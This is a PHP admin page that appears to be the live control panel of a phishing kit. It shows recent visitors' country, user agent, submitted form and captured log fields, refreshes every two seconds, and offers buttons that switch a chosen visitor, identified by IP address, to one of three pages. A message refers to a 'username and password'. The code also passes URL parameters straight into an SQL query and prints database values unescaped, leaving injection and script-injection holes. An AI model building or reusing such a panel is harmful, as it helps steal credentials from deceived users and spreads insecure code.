<?php include 'db.php'; ?>
<?php
$message = "";
if(isset($_GET['p']))
{
       $p_ = $_GET['p'];
       $ipAddress = $_GET['ipAddress'];
      
        //country, image, user_agent, current_page, submitted_form, selected_page, timeStamp
        $sql2 = "UPDATE visitors SET current_page='$p_' WHERE ip_address='$ipAddress'";
            // Execute the query
            if ($conn->query($sql2) === TRUE) {
                $message= "Record updated successfully with username and password ";
            } else {
                $message= "Error updating record: " . $conn->error;
            }
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin Page</title>
    <!-- Bootstrap CSS link -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
</head>
<body>
<div class="container mt-5">
        <h2>Visitor Data</h2>
        <p><?php echo $message; ?></p>
        <table class="table">
            <thead>
                <tr>
                    <th>Country</th>
                    <th>Image</th>
                    <th>User Agent</th>
                    <th>Current Page</th>
                    <th>Submitted Form</th>
                    <th>Selected Page</th>
                    <th>Time Stamp</th>
                    <th>page1</th>
                     <th>page2</th>
                    <th>page3</th>
                    <th>log1</th>
                     <th>log2</th>
                      <th>log3</th>
                </tr>
            </thead>
            <tbody>
                <?php
         

                $conn = new mysqli($servername, $username, $password, $dbname);

                // Check connection
                if ($conn->connect_error) {
                    die("Connection failed: " . $conn->connect_error);
                }

                // Fetching data from database
                $sql = "SELECT country, image, ip_address, user_agent, current_page, submitted_form, selected_page, timeStamp, log1, log2, log3 FROM visitors";
                $result = $conn->query($sql);

                if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {
                        //
                        
                         $fetchedDateTime = strtotime($row['timeStamp']);
        
                        // Get the current timestamp
                        $currentDateTime = time();
                        
                        // Calculate the difference in seconds
                        $differenceInSeconds = $currentDateTime - $fetchedDateTime;
                        
                        // Check if the difference is greater than 2 minutes (120 seconds)
                        if ($differenceInSeconds > 60) {
                           // sql delet the row containing the timestamp
                        } else {
                           // echo "The difference between the fetched time and current time is not greater than 2 minutes.";
                            echo "<tr>";
                            echo "<td>" . $row['country'] . "</td>";
                            echo "<td><img src='" . $row['image'] . "' width='50' height='50'></td>";
                            echo "<td>" . $row['user_agent'] . "</td>";
                            echo "<td>" . $row['current_page'] . "</td>";
                            echo "<td>" . $row['submitted_form'] . "</td>";
                            echo "<td>" . $row['selected_page'] . "</td>";
                            echo "<td>" . $row['timeStamp'] . "</td>";
                            echo "<td><a href=\"admin.php?p=page1&ipAddress=".$row['ip_address']."\"><button>test</button><a></td>";
                            echo "<td><a href=\"admin.php?p=page2&ipAddress=".$row['ip_address']."\"><button>test</button><a></td>";
                            echo "<td><a href=\"admin.php?p=page3&ipAddress=".$row['ip_address']."\"><button>test</button><a></td>";
                            echo "<td>" . $row['log1'] . "</td>";
                             echo "<td>" . $row['log2'] . "</td>";
                             echo "<td>" . $row['log3'] . "</td>";
                            echo "</tr>";
                            
                        }
                        

                    }
                } else {
                    echo "<tr><td colspan='7'>No data found</td></tr>";
                }
                $conn->close();
                ?>
            </tbody>
        </table>
    </div>


    <script>
        // Reload the page every 1 second (1000 milliseconds)
        setInterval(function(){
            location.reload();
        }, 2000);
    </script>
</body>
</html>
